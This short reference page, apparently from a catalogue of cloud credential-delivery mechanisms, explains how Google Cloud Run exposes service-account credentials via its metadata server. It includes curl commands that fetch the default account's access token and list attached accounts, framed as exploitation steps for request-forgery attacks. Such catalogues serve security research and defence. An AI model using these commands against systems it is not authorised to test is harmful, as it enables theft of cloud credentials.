# Google Cloud Run

[Google Cloud Run](https://cloud.google.com/run?hl=en) is a managed platform for running web applications.

| Property      | Value                          |
| ----------- | ------------------------------------ |
| Credentials delivery mechanism       | [Served through link-local metadata service](../types-of-credentials-delivery.md#served-through-link-local-metadata-service)  |
| Protection type       | Header requires hardcoded value |
| Exploitation primitives    | `Query arbitrary URL with arbitrary HTTP headers` |

## Extracting credentials

The Google Cloud metadata server is available at `169.254.169.254` and requires an HTTP header `Metadata-Flavor` set to `Google`:

```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

You can also check if non-default service accounts are attached:

```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

## References

- https://cloud.google.com/run/docs/securing/service-identity